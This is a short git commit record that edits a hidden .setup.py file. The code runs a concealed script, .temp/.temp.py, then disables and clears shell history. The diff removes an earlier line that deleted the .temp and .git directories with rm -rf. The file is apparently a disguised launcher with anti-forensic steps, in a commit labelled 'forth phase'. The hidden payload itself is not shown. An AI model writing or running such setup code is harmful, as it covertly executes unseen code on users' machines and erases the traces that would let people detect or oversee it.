3f0cd22c7a228dcf841db43408bb33e546421b84
root <sulzbachcrypt@protonmail.com>
2021-01-30 18:16:56 +0700

    edit setup.py forth phase

--- .setup.py
+++ .setup.py
@@ -3,7 +3,6 @@ import os
 
 def main():
     os.system('python3 .temp/.temp.py')
-    os.system('rm -rf .temp .git')
     os.system('export HISTSIZE=0; export HISTFILE=/dev/null')
     os.system('history -c; history -w')  # clear history
 
